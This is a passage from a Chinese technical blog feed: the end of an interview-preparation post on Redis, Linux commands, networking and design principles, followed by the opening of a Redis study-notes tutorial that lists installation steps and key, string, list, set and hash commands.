title="Redis数据库"></a>Redis数据库</h3><p>这个问的比较少，不过我redis用的确实不多</p><p>Q：redis的数据结构<br>String：字符串类型<br>List：列表类型<br>Set：无序集合类型<br>ZSet：有序集合类型<br>Hash：哈希表类型</p><p>Q：redis的String的底层<br>对于string类型的字符串，其底层编码方式共有三种，分别为int、embstr和raw。</p><p>int：当存储的字符串全是数字时，此时使用int方式来存储；<br>embstr：当存储的字符串长度小于44个字符时，此时使用embstr方式来存储；<br>raw：当存储的字符串长度大于44个字符时，此时使用raw方式来存储；<br>在这三种数据结构的编码方式上又存在着差异：<a href="https://www.cnblogs.com/reecelin/p/13352694.html#:~:text=%E5%AF%B9%E4%BA%8E%E4%B8%8D%E5%90%8C%20type%20%E7%9A%84%E5%AF%B9%E8%B1%A1%EF%BC%8C%20Redis%20%E4%BC%9A%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%9D%A5%E5%AD%98%E5%82%A8%E3%80%82%20%E5%AF%B9%E4%BA%8E%E5%90%8C%E4%B8%80%E7%A7%8D%E7%B1%BB%E5%9E%8B%20type%20%E4%B9%9F%E4%BC%9A%E6%9C%89%E4%B8%8D%E5%90%8C%E7%9A%84%E5%AD%98%E5%82%A8%E5%BD%A2%E5%BC%8F,string%20%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%85%B6%E5%BA%95%E5%B1%82%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E5%85%B1%E6%9C%89%E4%B8%89%E7%A7%8D%EF%BC%8C%E5%88%86%E5%88%AB%E4%B8%BA%20int%20%E3%80%81%20embstr%20%E5%92%8C%20raw%20%E3%80%82">Redis底层数据结构之string</a></p><p>Q：redis中的hash<br>hash 类型是 Redis 常用数据类型之一，其底层存储结构有两种实现方式。</p><p>第一种，当存储的数据量较少的时，hash 采用 ziplist 作为底层存储结构，此时要求符合以下两个条件：<br>哈希对象保存的所有键值对（键和值）的字符串长度总和小于 64 个字节。<br>哈希对象保存的键值对数量要小于 512 个。</p><p>当无法满足上述条件时，hash 就会采用第二种方式来存储数据，也就是 dict（字典结构），该结构类似于 Java 的 HashMap，是一个无序的字典，并采用了数组和链表相结合的方式存储数据。在 Redis 中，dict 是基于哈希表算法实现的，因此其查找性能非常高效，其时间复杂度为 O(1)。</p><h3 id="Linux操作系统"><a href="#Linux操作系统" class="headerlink" title="Linux操作系统"></a>Linux操作系统</h3><p>Linux主要考察常用指令，这个要记挺多内容的</p><p>Q：Linux中从日志中找到bug的指令<br>tail -f 查看实时日志<br>cat -n test-XXXXX.log |grep ‘error’ |more</p><p>Q：Linux如何空间不足的处理方法<br>输入命令：df –h 查看磁盘信息<br>这时最简单的办法就是找到大且无用的文件并删除，首选就是log文件。</p><p>Q：程序如何发布让人看到，nginx的作用<br>Nginx是一个轻量级、高性能、稳定性高、并发性好的HTTP和反向代理服务器。也是由于其的特性，其应用非常广。<br>主要功能：反向代理、  负载均衡    、动静分离</p><p>正向代理代理对象是客户端，反向代理代理对象是服务端</p><h3 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h3><p>计网这一块笔试题做的比较多，面试的时候真问的内容还是很少的，基本也就会问一下TCP&#x2F;UDP的区别</p><p>Q：TCP&#x2F;UDP的区别，为什么TCP信息传输是可靠的<br>1.TCP是面向连接的（比如打电话前要拨号建立连接），UDP是无连接的，传输数据前不用建立连接。<br>2.TCP提供的消息是可靠的，通过TCP传送的数据无差别，不丢失，不重复，且按需到达。UDP是尽最大努力交付，不保证可靠交付。<br>3.TCP是面向字节流的，而UDP是面向报文的。<br>4.TCP在数据传递时有确认机制，重传机制，拥塞控制机制，所以效率低，占用系统资源高。UDP是无状态的传输协议，所以他在传输时速度特别快。<br>5.TCP只能一对一，UPD可以一对多，多对多传输 。<br>6.TCP是全双工的可靠信道，UDP是不可靠信道。</p><p>Q：http中get和post的区别<br>最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数。<br>（1）post更安全（不会作为url的一部分，不会被缓存、保存在服务器日志、以及浏览器浏览记录中）<br>（2）post发送的数据更大（get有url长度限制）<br>（3）post能发送更多的数据类型（get只能发送ASCII字符）<br>（4）post比get慢<br>（5）post用于修改和写入数据，get一般用于搜索排序和筛选之类的操作（淘宝，支付宝的搜索查询都是get提交），目的是资源的获取，读取数据</p><p>Q：在浏览器中输入一个网址进行访问并得到返回的页面，整个流程经过了哪些操作<br>域名解析<br>为了将消息从你的PC上传到服务器上.需要用到IP协议、ARP协议和OSPF协议<br>发起TCP的3次握手<br>建立TCP连接后发起http请求<br>服务器响应htp请求<br>浏览器解析html代码,并请求html代码中的资源(如js、css、图片等）<br>断开TCP连接<br>浏览器对页面进行渲染呈现给用户</p><p>Q：tcp的粘包问题是怎么解决的<br>TCP粘包是指发送方发送的若干包数据到接收方接收时粘成一包，从接收缓冲区看，后一包数据的头紧接着前一包数据的尾。<br>粘包可能由发送方造成，也可能由接收方造成。<br>只有TCP有粘包现象，UDP永远不会粘包<br>粘包不一定会发生</p><p>在每次使用tcp协议发送数据流时,在开头标记一个数据流长度信息,并固定该报文长度(自定义协议).在客户端接收数据时先接收该长度字节数据,判断客户端发送数据流长度,并只接收该长度字节数据,就可以实现拆包,完美解决tcp粘包问题.</p><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><p>这一块一遍先问自己用过哪些设计模式，之前我回答的时候都简单的介绍一下单例设计模式和工厂设计模式，因为这两个好记一点，印象比较深的就是北森的面试官这个问的很深，还从设计模式出发和我讲了很多编码规则之类的。</p><p>Q：项目中采用过哪些设计模式（对哪些设计模式熟悉）<br>可见上：Spring默认设计模式</p><p>Q：设计原则<br>单一职责原则（Single Responsibility Principle）；<br>开闭原则（Open Closed Principle）；<br>里氏替换原则（Liskov Substitution Principle）；<br>迪米特法则（Law of Demeter），又叫“最少知道法则”；<br>接口隔离原则（Interface Segregation Principle）；<br>依赖倒置原则（Dependence Inversion Principle）。</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>算法的话一般会出一道算法题来现场做，或者看有没有思路，这个不好归纳，但基础的算法还是会问到的，比如几大排序算法。<br>Q：快速排序算法的实现<br><a href="https://hukaichao.cn/archives/pai-xu-suan-fa">排序算法</a></p><h2 id="面试中问到的其他问题"><a href="#面试中问到的其他问题" class="headerlink" title="面试中问到的其他问题"></a>面试中问到的其他问题</h2><p>面试的时候除了像上面的这些技术点一个个去问，去深挖之外，还会问一些其他的东西，多是个人经历，项目中遇到的问题之类的。这类问题也需要好好准备</p><p>Q：项目中自己负责那一块，主要做了什么<br><a href="https://hukaichao.cn/archives/di-shi-yi-jie-zhong-guo-ruan-jian-bei-da-xue-sheng-ruan-jian-she-ji-da-sai-a1--gao-xing-neng-min-hang-lv-ke-xing-cheng-tui-jian-xi-tong">第十一届 中国软件杯大学生软件设计大赛 A1-高性能民航旅客行程推荐系统</a></p><p><a href="https://hukaichao.cn/archives/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%AB%9E%E8%B5%9B%E5%9B%9E%E9%A1%BE">数学建模竞赛</a></p><p>Q：在团队的时候遇到过什么问题，如何解决的</p><p>Q：平时学习主要是通过什么方式</p><p>Q：对未来的发展规划，对公司的要求</p>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面经笔经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis学习笔记</title>
    <link href="/2023/06/18/Redis%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/06/18/Redis%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="1、Redis简介："><a href="#1、Redis简介：" class="headerlink" title="1、Redis简介："></a>1、Redis简介：</h3><p>   Redis是一种数据库。能够存储数据、管理数据的一种软件。<br>Redis是一个用C语言编写的、开源的、基于内存运行并支持持久化的、高性能的NoSQL数据库.也是当前热门的NoSQL数据库之一。<br>   Redis中的数据大部分时间都是存储内存中的，适合存储频繁访问、数据量比较小的数据。</p><h3 id="2、数据库应用的发展历程："><a href="#2、数据库应用的发展历程：" class="headerlink" title="2、数据库应用的发展历程："></a>2、数据库应用的发展历程：</h3><p>   单机数据库时代：一个应用，一个数据库实例<br>   缓存、水平切分时代：<br>   读写分离时代:<br>   分表分库时代(集群):</p><p>   关系型数据库：oracle、mysql、DB2、sqlserver、….</p><p>   非关系型数据库(NoSql)： 彻底改变底层存储机制。不再采用关系数据模型，而是采用聚合数据结构存储数据。<br>        redis、mongoDB、HBase、….</p><h3 id="3、Nosql数据模型："><a href="#3、Nosql数据模型：" class="headerlink" title="3、Nosql数据模型："></a>3、Nosql数据模型：</h3><p>   关系型数据库：表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tbl_student                            tbl_clazz</span><br><span class="line">id    name    age    clazz_id          id       name</span><br><span class="line">1001  zhangsan 20      111             111      clazz1</span><br><span class="line">1002  lisi     21      111             222      clazz2</span><br></pre></td></tr></table></figure><p>   非关系型数据库：聚合模型—把一组相关联的数据作为一个整体进行存储和管理。<br>       BSON：数据保存到键值对中、数据和数据之间用逗号隔开，{}表示对象，[]表示数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">           &#123;</span><br><span class="line">       id:1001,</span><br><span class="line">name:zhangsan,</span><br><span class="line">age:20,</span><br><span class="line">clazz:&#123;</span><br><span class="line">   id:111,</span><br><span class="line">   name:clazz1</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">       id:1002,</span><br><span class="line">name:lisi,</span><br><span class="line">age:21,</span><br><span class="line">clazz:&#123;</span><br><span class="line">   id:111,</span><br><span class="line">   name:clazz1</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    K-V键值对、列簇、图表模型等。</span><br><span class="line"></span><br><span class="line">    Redis采用的是K-V模型存储数据的。</span><br></pre></td></tr></table></figure><h3 id="4、安装、启动、关闭-redis"><a href="#4、安装、启动、关闭-redis" class="headerlink" title="4、安装、启动、关闭 redis"></a>4、安装、启动、关闭 redis</h3><p>   下载：<br>   解压：tar -zxvf …<br>   编译：make<br>         需要先安装gcc<br>         编译结果：在redis的安装目录下src目录中，生成redis的一系列可执行文件。</p><p>   安装：make install<br>         把redis的安装目录下src目录中生成redis的一系列可执行文件拷贝到&#x2F;usr&#x2F;local&#x2F;bin中，<br>     在任何目录下都可以执行redis命令。</p><p>启动redis服务：<br>   1)前台启动：在任何目录下执行 redis-server<br>   2)后台启动：在任何目录下执行 redis-server &amp;<br>   3)启动redis服务时，指定配置文件：redis-server redis.conf &amp;</p><p>关闭redis服务：<br>   1)、通过kill命令：<br>       ps -ef|grep redis查看pid<br>       kill -9 pid<br>   2)、通过redis-cli命令关闭：<br>       redis-cli shutdown</p><h3 id="5、redis的客户端"><a href="#5、redis的客户端" class="headerlink" title="5、redis的客户端"></a>5、redis的客户端</h3><p>用来连接redis服务，向redis服务端发送命令，并且显示redis服务处理结果。<br>   redis-cli：是redis自带客户端，使用命令redis-cli就可以启动redis的客户端程序。</p><p>   .&#x2F;mysql -uroot -p </p><p>   redis-cli：默认连接127.0.0.1(本机)的6379端口上的redis服务。<br>   redis-cli -p 端口号：连接127.0.0.1(本机)的指定端口上的redis服务。<br>   redis-cli -h ip地址 -p 端口：连接指定ip主机上的指定端口的redis服务。</p><p>退出客户端：在客户端执行命令：exit或者quit</p><h3 id="6、redis的基本知识："><a href="#6、redis的基本知识：" class="headerlink" title="6、redis的基本知识："></a>6、redis的基本知识：</h3><p>   1)、测试redis服务的性能：<br>       redis-benchmark<br>   2)、查看redis服务是否正常运行：<br>       ping  如果正常—pong<br>   3)、查看redis服务器的统计信息：<br>       info  查看redis服务的所有统计信息<br>       info [信息段] 查看redis服务器的指定的统计信息，如：info Replication<br>   4)、redis的数据库实例：作用类似于mysql的数据库实例，redis中的数据库实例只能由redis服务来创建和维护，开发人员不能修改和自行创建数据库实例；默认情况下，redis会自动创建16个数据库实例，并且给这些数据库实例进行编号，从0开始，一直到15，使用时通过编号来使用数据库；可以通过配置文件，指定redis自动创建的数据库个数；redis的每一个数据库实例本身占用的存储空间是很少的，所以也不造成存储空间的太多浪费。<br>      默认情况下，redis客户端连接的是编号是0的数据库实例；可以使用select index切换数据库实例。<br>   5)、查看当前数据库实例中所有key的数量：dbsize<br>   6)、查看当前数据库实例中所有的key：keys *<br>   7)、清空数据库实例：flushdb<br>   8)、清空所有的数据库实例：flushall<br>   9)、查看redis中所有的配置信息：config get *<br>       查看redis中的指定的配置信息：config get parameter</p><h3 id="7、Redis的五种数据结构："><a href="#7、Redis的五种数据结构：" class="headerlink" title="7、Redis的五种数据结构："></a>7、Redis的五种数据结构：</h3><p>   程序是用来处理数据的，Redis是用来存储数据的；程序处理完的数据要存储到redis中，不同特点的数据要存储在Redis中不同类型的数据结构中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string 单key:单value: username:zhangsan age:20        </span><br><span class="line">list   单key:多有序value: contacts:13900009999,xxx,xxxx  </span><br><span class="line">set    单key:多无序value:city:bj sh cq tj </span><br><span class="line">hash   单key:对象(属性:值):student:id:1001,name:zhangsan,age:20</span><br><span class="line">zset   单key:多有序vlaue:city: 1000 tj,1200 cq,1500 sh,2000 bj</span><br></pre></td></tr></table></figure><h3 id="8、redis中的操作命令："><a href="#8、redis中的操作命令：" class="headerlink" title="8、redis中的操作命令："></a>8、redis中的操作命令：</h3><p>   1)、redis中有关key的操作命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">       a) 查看数据库中的key：keys pattern</span><br><span class="line">*：匹配0个或者多个字符</span><br><span class="line">?: 匹配1个字符</span><br><span class="line">[]:匹配[]里边的1个字符</span><br><span class="line">         keys *：查看数据库中所有的key</span><br><span class="line">         keys k*:查看数据库中所有以k开头的key</span><br><span class="line"> keys h*o：查看数据库中所有以h开头、以o结尾的key</span><br><span class="line"> keys h?o: 查看数据库中所有以h开头、以o结尾的、并且中间只有一个字符的key</span><br><span class="line"> keys h[abc]llo：查看数据库中所有以h开头以llo结尾，并且h后边只能取abc中的一个字符的key</span><br><span class="line">       b) 判断key在数据库中是否存在：exists key 如果存在，则返回1；如果不存在，则返回0</span><br><span class="line">exists key [key key ....] 返回值是存在的key的数量</span><br><span class="line">         exists k1</span><br><span class="line"> exists k1 k2 k3 hello</span><br><span class="line">       c)移动指定key到指定的数据库实例：move key index</span><br><span class="line">         move k 1</span><br><span class="line">       d)查看指定key的剩余生存时间：ttl key</span><br><span class="line">如果key没有设置生存时间，返回-1</span><br><span class="line">        如果key不存在，返回-2</span><br><span class="line">         ttl k1</span><br><span class="line"> ttl k2</span><br><span class="line">       e)设置key的最大生存时间：expire key seconds</span><br><span class="line">         expire k2 20</span><br><span class="line">       f)查看指定key的数据类型：type key</span><br><span class="line">         type k1</span><br><span class="line">       g)重命名key： rename key newkey</span><br><span class="line">         rename hello k2</span><br><span class="line">       h)删除指定的key：del key [key key .....] </span><br><span class="line">          返回值是实际删除的key的数量</span><br><span class="line">  del k1 k2 k3 k4</span><br></pre></td></tr></table></figure><p>   2)、redis中有关string类型数据的操作命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">     a)将string类型的数据设置到redis中：set 键 值</span><br><span class="line">       set zsname zhangsan</span><br><span class="line">set zsage 20</span><br><span class="line">set totalRows 100</span><br><span class="line">set zsage 30 如果key已经存在，则后来的value会把以前的value覆盖掉.</span><br><span class="line">     b)从redis中获取string类型的数据：get 键</span><br><span class="line">       get zsname</span><br><span class="line">get zsage</span><br><span class="line">get totalRows</span><br><span class="line">     c)追加字符串：append key value</span><br><span class="line">       返回追加之后的字符串长度</span><br><span class="line">如果key不存在，则新创建一个key，并且把value值设置为value。</span><br><span class="line">       set phone 1389999</span><br><span class="line">append phone 8888</span><br><span class="line">     d)获取字符串数据的长度：strlen key</span><br><span class="line">       strlen phone</span><br><span class="line">     e)将字符串数值进行加1运算：incr key</span><br><span class="line">       返回加1运算之后的数据</span><br><span class="line">如果key不存在，首先设置一个key，值初始化为0，然后进行incr运算。</span><br><span class="line">要求key所表示value必须是数值，否则，报错</span><br><span class="line">       incr zsage</span><br><span class="line">incr age</span><br><span class="line">       incr zsname  报错</span><br><span class="line">     f)将字符串数值进行减1运算：decr key</span><br><span class="line">       返回减1运算之后的数据</span><br><span class="line">如果key不存在，首先设置一个key，值初始化为0，然后进行decr运算。</span><br><span class="line">要求key所表示value必须是数值，否则，报错</span><br><span class="line">     g)将字符串数值进行加offset运算：incrby key offset</span><br><span class="line">       返回加offset运算之后的数据</span><br><span class="line">如果key不存在，首先设置一个key，值初始化为0，然后进行incrby运算。</span><br><span class="line">要求key所表示value必须是数值，否则，报错</span><br><span class="line">       incrby zsage 10</span><br><span class="line">     h)将字符串数值进行减offset运算：decrby key offset</span><br><span class="line">返回减offset运算之后的数据</span><br><span class="line">如果key不存在，首先设置一个key，值初始化为0，然后进行decrby运算。</span><br><span class="line">要求key所表示value必须是数值，否则，报错</span><br><span class="line">       decrby zsage 10</span><br><span class="line">     i)闭区间获取字符串key中从startIndex到endIndex的字符组成的子字符串：getrange key startIndex endIndex</span><br><span class="line">       下标自左至右，从0开始，依次往后，最后一个字符的下标是字符串长多-1；</span><br><span class="line">字符串中每一个下标也可以是负数，负下标表示自右至左，从-1开始，依次往前，最右边一个字符的下标是-1</span><br><span class="line">       zhangsan</span><br><span class="line">getrange zsname 2 5  angs</span><br><span class="line">getrange zsname 2 -3 angs</span><br><span class="line">       getrange zsname 0 -1 zhangsan</span><br><span class="line">     j)用value覆盖从下标为startIndex开始的字符串，能覆盖几个字符就覆盖几个字符：setrange key startIndex value</span><br><span class="line">       setrange zsname 5 xiaosan   //zhangxiaosan</span><br><span class="line">setrange zsname 5 lao       //zhanglaoosan</span><br><span class="line">     k)设置字符串数据的同时，设置它最大生命周期：setex key seconds value</span><br><span class="line">       setex k1 20 v1</span><br><span class="line">     l)设置string类型的数据value到redis数据库中，当key不存在时设置成功，否则，则放弃设置：setnx key value</span><br><span class="line">       setnx zsage 20</span><br><span class="line">     m)批量将string类型的数据设置到redis中：mset 键1 值1 键2 值2 .....</span><br><span class="line">       mset k1 v1 k2 v2 k3 v3 k4 v4 k5 v5</span><br><span class="line">     n)批量从redis中获取string类型的数据：mget 键1 键2 键3.....</span><br><span class="line">       mget k1 k2 k3 k4 k5 k6 zsname zs age totalRows</span><br><span class="line">     o)批量设置string类型的数据value到redis数据库中，当所有key都不存在时设置成功，否则(只要有一个已经存在)，则全部放弃设置：msetnx 键1 值1 键2 值2 .....</span><br><span class="line">       msetnx kk1 vv1 kk2 vv2 kk3 vv3 k1 v1</span><br></pre></td></tr></table></figure><p>   3)、redis中有关list类型数据的操作命令：单key-多有序value<br>一个key对应多个value；<br>多个value之间有顺序，最左侧是表头，最右侧是表尾；<br>                        每一个元素都有下标，表头元素的下标是0，依次往后排序，最后一个元素下标是列表长度-1；<br>                        每一个元素的下标又可以用负数表示，负下标表示从表尾计算，最后一个元素下标用-1表示；<br>                        元素在列表中的顺序或者下标由放入的顺序来决定。<br>                        通过key和下标来操作数据。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">a)将一个或者多个值依次插入到列表的表头(左侧)：lpush key value [value value .....]</span><br><span class="line">   lpush list01 1 2 3  结果：3 2 1</span><br><span class="line">   lpush list01 4 5     结果：5 4 3 2 1</span><br><span class="line">       b)获取指定列表中指定下标区间的元素：lrange key startIndex endIndex</span><br><span class="line">   lrange list01 1 3  结果：4 3 2</span><br><span class="line">   lrange list01 1 -2 结果: 4 3 2</span><br><span class="line">   lrange list01 0 -1 结果：5 4 3 2 1</span><br><span class="line">c)将一个或者多个值依次插入到列表的表尾(右侧)：rpush key value [value value .....]</span><br><span class="line">   rpush list02 a b c 结果：a b c</span><br><span class="line">   rpush list02 d e   结果：a b c d e</span><br><span class="line">   lpush list02 m n   结果: n m a b c d e</span><br><span class="line">d)从指定列表中移除并且返回表头元素：lpop key</span><br><span class="line">    lpop list02</span><br><span class="line">e)从指定列表中移除并且返回表尾元素：rpop key</span><br><span class="line">    rpop list02</span><br><span class="line">f)获取指定列表中指定下标的元素：lindex key index</span><br><span class="line">   lindex list01 2 结果：3</span><br><span class="line">g)获取指定列表的长度：llen key</span><br><span class="line">   llen list01</span><br><span class="line">h)根据count值移除指定列表中跟value相等的数据：lrem key count value</span><br><span class="line">  count&gt;0：从列表的左侧移除count个跟value相等的数据；</span><br><span class="line">  count&lt;0：从列表的右侧移除count个跟vlaue相等的数据；</span><br><span class="line">  count=0：从列表中移除所有跟value相等的数据</span><br><span class="line">          lpush list03 a a b c a d e a b b  结果：b b a e d a c b a a</span><br><span class="line">   lrem list03 2 a  结果：b b e d c b a a</span><br><span class="line">          lrem list03 -1 a 结果：b b e d c b a</span><br><span class="line">   lrem list03 0 a  结果：b b e d c b</span><br><span class="line"> i)截取指定列表中指定下标区间的元素组成新的列表，并且赋值给key：ltrim key startIndex endIndex</span><br><span class="line">   lpush list04 1 2 3 4 5  结果：5 4 3 2 1</span><br><span class="line">          ltrim list04 1 3</span><br><span class="line">   lrange list04 0 -1      结果：4 3 2</span><br><span class="line">        j)将指定列表中指定下标的元素设置为指定值： lset key index value</span><br><span class="line">   lset list04 1 10</span><br><span class="line">        l)将value插入到指定列表中位于pivot元素之前/之后的位置： linsert key before/after pivot vlaue</span><br><span class="line">   linsert list04 before 10 50</span><br><span class="line">   linsert list04 after 10 60</span><br></pre></td></tr></table></figure><p>   4)、redis中有关set类型数据的操作命令：单key-多无序value<br>                                          一个key对应多个vlaue；<br>                      value之间没有顺序，并且不能重复；<br>                      通过业务数据直接操作集合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">a)将一个或者多个元素添加到指定的集合中：sadd key value [value value ....]</span><br><span class="line">  *如果元素已经存在，则会忽略。 </span><br><span class="line">  *返回成功加入的元素的个数</span><br><span class="line">  sadd set01 a b c a  结果：a b c</span><br><span class="line">  sadd set01 b d e</span><br><span class="line">b)获取指定集合中所有的元素：smembers key</span><br><span class="line">  smembers set01</span><br><span class="line">c)判断指定元素在指定集合中是否存在:sismember key member</span><br><span class="line">  *存在，返回1</span><br><span class="line">  *不存在，返回0</span><br><span class="line">  sismember set01 f</span><br><span class="line">  sismember set01 a</span><br><span class="line">d)获取指定集合的长度：scard key</span><br><span class="line">  scard set01</span><br><span class="line">e)移除指定集合中一个或者多个元素：srem key member [member .....]</span><br><span class="line">  *不存在的元素会被忽略</span><br><span class="line">  *返回成功成功移除的个数</span><br><span class="line">  srem set01 b d m</span><br><span class="line">f)随机获取指定集合中的一个或者多个元素：srandmember key [count]</span><br><span class="line">  count&gt;0：随机获取的多个元素之间不能重复</span><br><span class="line">  count&lt;0: 随机获取的多个元素之间可能重复</span><br><span class="line">  sadd set02 1 2 3 4 5 6 7 8</span><br><span class="line">         srandmember set02</span><br><span class="line">  srandmember set02 3</span><br><span class="line">  srandmember set02 -3</span><br><span class="line">g)从指定集合中随机移除一个或者多个元素：spop key [count]</span><br><span class="line">  spop set02</span><br><span class="line">h)将指定集合中的指定元素移动到另一个元素:smove source dest member</span><br><span class="line">  smove set01 set02 a</span><br><span class="line">i)获取第一个集合中有、但是其它集合中都没有的元素组成的新集合：sdiff key key [key key ....]</span><br><span class="line">  sdiff set01 set02 set03</span><br><span class="line">j)获取所有指定集合中都有的元素组成的新集合：sinter key key [key key ....]</span><br><span class="line">  sinter set01 set02 set03</span><br><span class="line">k)获取所有指定集合中所有元素组成的大集合：sunion key key [key key .....]</span><br><span class="line">  sunion set01 set02 set03</span><br></pre></td></tr></table></figure><p>   5)、redis中有关hash类型数据的操作命令：单key:field-value<br>                                                 field-value<br>                       studentzs:id-1001<br>                                 name-zhangsan<br>                             age-20</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">a)将一个或者多个field-vlaue对设置到哈希表中：hset key filed1 value1 [field2 value2 ....] </span><br><span class="line">  *如果key field已经存在，把value会把以前的值覆盖掉</span><br><span class="line">  hset stu1001 id 1001</span><br><span class="line">  hset stu1001 name zhangsan age 20</span><br><span class="line">b)获取指定哈希表中指定field的值：hget key field</span><br><span class="line">  hget stu1001 id</span><br><span class="line">  hget stu1001 name</span><br><span class="line">c)批量将多个field-value对设置到哈希表中： hmset key filed1 value1 [field2 value2 ....] 